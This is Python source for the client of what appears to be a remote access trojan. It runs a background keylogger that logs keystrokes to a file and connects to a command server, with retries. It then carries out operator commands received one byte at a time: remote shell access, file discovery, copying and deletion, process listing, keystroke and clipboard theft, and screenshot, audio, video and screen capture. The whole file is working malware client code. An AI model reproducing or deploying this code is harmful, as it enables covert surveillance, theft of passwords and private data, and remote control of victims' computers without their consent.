import os
import platform
import socket
import logging
import time
from pynput.keyboard import Listener
from modules.client_module import (gather_system_info, command_line_interface, 
                                file_directory_discovery, remote_file_copy,
                                file_deletion, process_discovery, input_capture,
                                clipboard_data, screenshot_capture, audio_capture,
                                video_capture, screen_capture)

LOG_FILE = "keys.txt"
SERVER_ADDRESS = ("127.0.0.1", 585)
RETRY_INTERVAL = 5

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")
def onpress(key):
    logging.info(str(key))

def connect_to_server():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect(SERVER_ADDRESS)
            operation_system = platform.system()
            server.send(operation_system[0].encode())
            return server, operation_system
        except ConnectionError:
            time.sleep(RETRY_INTERVAL)

def main():
    while True:
        try:
            server, operation_system = connect_to_server()
            
            while True:
                try:
                    byte = server.recv(1).decode()
                    if not byte:
                        print("Connection closed by the server.")
                        break
                    if byte == "1":
                        gather_system_info(server, operation_system)
                    elif byte == "2":
                        command_line_interface(server)
                    elif byte == "3":
                        file_directory_discovery(server, operation_system)
                    elif byte == "4":
                        remote_file_copy(server)
                    elif byte == "5":
                        file_deletion(server)
                    elif byte == "6":
                        process_discovery(server, operation_system)
                    elif byte == "7":
                        input_capture(server)
                        os.remove("keys.txt")
                    elif byte == "8":
                        clipboard_data(server)
                    elif byte == "9":
                        screenshot_capture(server)
                    elif byte == "A":
                        audio_capture(server)
                    elif byte == "B":
                        video_capture(server)
                    elif byte == "C":
                        screen_capture(server)
                        print("bomba")
                    elif byte == "S":
                        break
                except socket.error as e:
                    print(f"Error: {e}")
                    break
        except Exception as e:
            print(f"{e}")
            time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    with Listener(on_press=onpress):
        main()